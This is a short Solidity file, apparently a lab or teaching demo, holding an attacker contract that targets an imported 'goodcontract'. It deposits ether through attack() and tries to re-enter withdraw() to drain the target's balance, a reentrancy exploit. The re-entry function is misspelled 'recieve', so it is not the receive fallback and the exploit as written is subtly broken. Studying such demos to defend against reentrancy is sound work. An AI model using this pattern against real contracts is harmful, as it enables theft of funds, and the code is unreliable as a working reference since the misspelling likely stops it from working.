//SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.0;
import "./goodcontract.sol";
contract badcontract {
    goodcontract public Gc;
    event Log(address add,string message);
    constructor(address _gc_address){
        Gc= goodcontract(_gc_address);
    }

    function recieve() external payable{
        if(address(Gc).balance>0){
            Gc.withdraw();

        }
        else{
            emit Log(address(Gc),"no balance");
        }
    }

    function attack() public payable{
        Gc.addbalance{value: msg.value}();
        Gc.withdraw();
    }


}